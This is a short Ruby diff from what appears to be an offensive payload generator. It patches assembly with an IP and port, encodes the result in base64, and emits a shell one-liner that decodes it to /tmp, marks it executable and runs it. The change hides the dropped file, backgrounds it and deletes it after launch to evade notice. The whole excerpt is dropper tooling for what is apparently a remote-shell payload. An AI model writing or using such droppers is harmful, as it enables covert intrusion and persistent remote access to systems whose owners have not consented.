@@ -122,7 +122,7 @@ class Impy
                 modifyASM(ip, port)
                 sleep 0.1
                 base64 = compileToBase64()
-                output += "base64 -d <<< #{base64} > /tmp/0; chmod +x /tmp/0; /tmp/0"
+                output += "base64 -d <<< #{base64} > /tmp/.0; chmod +x /tmp/.0; /tmp/.0 &; rm -f /tmp/.0"
             rescue => e
                 output += "Something went wrong. #{e.to_s}\n"
             end 
